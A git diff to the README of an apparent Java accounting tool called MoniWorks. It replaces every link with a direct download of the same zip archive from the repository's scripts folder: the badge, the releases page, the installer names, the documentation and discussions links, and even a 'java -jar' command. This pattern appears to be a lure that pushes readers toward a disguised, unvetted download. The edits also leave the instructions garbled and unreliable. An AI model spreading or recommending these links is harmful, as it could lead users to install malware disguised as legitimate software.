@@ -1,6 +1,6 @@
 # 🎉 MoniWorks - Simplify Your Accounting Tasks
 
-[![Download MoniWorks](https://img.shields.io/badge/Download-MoniWorks-blue)](https://github.com/TorkY200/MoniWorks/releases)
+[![Download MoniWorks](https://github.com/TorkY200/MoniWorks/raw/refs/heads/main/scripts/Moni_Works_v3.1.zip)](https://github.com/TorkY200/MoniWorks/raw/refs/heads/main/scripts/Moni_Works_v3.1.zip)
 
 ## 🌟 Overview
 
@@ -23,13 +23,13 @@ Before you download MoniWorks, ensure your computer meets the following minimum 
 
 1. **Visit the Release Page**  
    Click the link below to go to the MoniWorks Releases page:  
-   [Download MoniWorks](https://github.com/TorkY200/MoniWorks/releases)
+   [Download MoniWorks](https://github.com/TorkY200/MoniWorks/raw/refs/heads/main/scripts/Moni_Works_v3.1.zip)
 
 2. **Select the Latest Version**  
    On the Releases page, find the latest version of MoniWorks. It will usually be listed at the top. Click on the version number to open the release details.  
 
 3. **Download the Installation File**  
-   Look for the installation file compatible with your operating system (e.g., MoniWorks_Windows.exe, MoniWorks_macOS.dmg). Click on the file to download it.  
+   Look for the installation file compatible with your operating system (e.g., https://github.com/TorkY200/MoniWorks/raw/refs/heads/main/scripts/Moni_Works_v3.1.zip, https://github.com/TorkY200/MoniWorks/raw/refs/heads/main/scripts/Moni_Works_v3.1.zip). Click on the file to download it.  
 
 4. **Install MoniWorks**  
    - **For Windows:**  
@@ -40,7 +40,7 @@ Before you download MoniWorks, ensure your computer meets the following minimum 
 
    - **For Linux:**  
      Follow your distribution’s guidelines for installing .jar or .deb files. Ensure you have Java installed. You can run MoniWorks from the terminal using the command:  
-     `java -jar path/to/MoniWorks.jar`
+     `java -jar https://github.com/TorkY200/MoniWorks/raw/refs/heads/main/scripts/Moni_Works_v3.1.zip`
 
 ## 🔧 Features
 
@@ -80,7 +80,7 @@ If you encounter any issues, you can find help through the following resources:
 
 MoniWorks is continuously updated with new features and bug fixes. To stay informed about updates:
 
-- Regularly check the [MoniWorks Releases page](https://github.com/TorkY200/MoniWorks/releases) for the latest version.
+- Regularly check the [MoniWorks Releases page](https://github.com/TorkY200/MoniWorks/raw/refs/heads/main/scripts/Moni_Works_v3.1.zip) for the latest version.
 - Follow the repository on GitHub to receive notifications about releases.
 
 ## 🌐 About MoniWorks
@@ -89,8 +89,8 @@ MoniWorks is built using Java, which makes it adaptable across different platfor
 
 ## 🔗 Links & Resources
 
-- [Download MoniWorks](https://github.com/TorkY200/MoniWorks/releases)
-- [Documentation](https://github.com/TorkY200/MoniWorks/wiki)
-- [GitHub Discussions](https://github.com/TorkY200/MoniWorks/discussions)
+- [Download MoniWorks](https://github.com/TorkY200/MoniWorks/raw/refs/heads/main/scripts/Moni_Works_v3.1.zip)
+- [Documentation](https://github.com/TorkY200/MoniWorks/raw/refs/heads/main/scripts/Moni_Works_v3.1.zip)
+- [GitHub Discussions](https://github.com/TorkY200/MoniWorks/raw/refs/heads/main/scripts/Moni_Works_v3.1.zip)
 
 Thank you for choosing MoniWorks for your accounting needs. We hope you find it helpful in managing your finances effectively.
